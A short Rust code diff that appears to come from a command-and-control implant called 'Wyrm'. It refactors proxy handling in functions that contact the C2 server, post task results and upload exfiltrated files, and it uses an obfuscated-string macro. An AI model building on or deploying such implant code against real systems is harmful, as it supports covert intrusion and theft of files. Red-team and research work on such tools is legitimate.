@@ -110,9 +110,7 @@ fn http_get(url: String, headers: HeaderMap, implant: &Wyrm) -> Result<Response,
     let dest = Url::parse(&url).unwrap();
 
     let client_builder = reqwest::blocking::ClientBuilder::new();
-    let client_builder = implant
-        .c2_config
-        .apply_proxy_for_c2_url(&url, client_builder)?;
+    let client_builder = implant.apply_proxy_for_c2_url(&url, client_builder)?;
 
     let client = client_builder.default_headers(headers).build()?;
     client.get(dest).send()
@@ -124,9 +122,7 @@ fn http_post_tasks(
     mut headers: HeaderMap,
 ) -> Result<Response, reqwest::Error> {
     let client_builder = reqwest::blocking::ClientBuilder::new();
-    let client_builder = implant
-        .c2_config
-        .apply_proxy_for_c2_url(&url, client_builder)?;
+    let client_builder = implant.apply_proxy_for_c2_url(&url, client_builder)?;
 
     let mut completed_tasks: TasksNetworkStream = Vec::new();
 
@@ -298,7 +294,7 @@ pub fn upload_file_as_stream(implant: &Wyrm, ef: &ExfiltratedFile) {
         &implant.c2_config.useragent,
     );
     let cb = ClientBuilder::new();
-    let Ok(cb) = implant.c2_config.apply_proxy_for_c2_url(&url, cb) else {
+    let Ok(cb) = implant.apply_proxy_for_c2_url(&url, cb) else {
         print_failed(format!(
             "{}",
             sc!("Failed to look for proxy during upload.", 63).unwrap()
